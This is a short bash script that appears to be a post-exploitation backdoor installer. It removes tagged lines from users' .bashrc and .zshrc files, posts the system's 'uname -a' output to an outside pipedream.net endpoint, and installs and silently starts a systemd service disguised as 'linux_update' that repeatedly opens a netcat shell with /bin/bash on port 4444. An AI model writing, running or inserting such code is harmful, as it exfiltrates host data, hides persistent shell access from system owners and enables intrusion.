#!/bin/bash

function uninstall_in_rc() {
    if ! [ -f "$1" ]; then
        return
    fi
    grep -vF "h1dD3N" "$1" | grep . > "$1.h1dD3Nbak" && cat "$1.h1dD3Nbak" > "$1" && rm "$1.h1dD3Nbak"
}

for user in `find /home/ -maxdepth 1 -type d`; do
    uninstall_in_rc "$user/.bashrc"
    uninstall_in_rc "$user/.zshrc"
done

uname -a | curl https://enj7fhiwooawt.x.pipedream.net/root -X POST -d "$(</dev/stdin)"

echo -e "
[Unit]
Description=Systemd service.

[Service]
Type=simple
ExecStart=/bin/bash -c 'while [ 1 ]; do nc 127.0.0.1 4444 --e /bin/bash; sleep 10; done'

[Install]
WantedBy=multi-user.target
" > /etc/systemd/system/linux_update.service
systemctl enable linux_update &> /dev/null
systemctl start linux_update &> /dev/null
